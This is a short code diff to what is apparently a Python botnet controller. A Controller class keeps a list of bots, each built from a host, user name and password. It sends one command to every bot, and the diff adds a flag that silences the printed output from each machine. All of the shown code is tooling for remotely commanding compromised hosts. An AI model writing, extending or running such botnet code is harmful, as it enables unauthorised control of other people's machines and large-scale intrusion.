@@ -5,11 +5,12 @@ class Controller:
     def __init__(self):
         self.botnet = []
 
-    def command_bots(self, command):
+    def command_bots(self, command, show_output):
         for bot in self.botnet:
             attack = bot.send_command(command)
-            print(f"Output from [{bot.user}@{bot.host}]:")
-            print(attack.decode("utf-8"))
+            if show_output:
+                print(f"Output from [{bot.user}@{bot.host}]:")
+                print(attack.decode("utf-8"))
 
     def add_bot(self, host, user, password):
         new_bot = Bot(host, user, password)
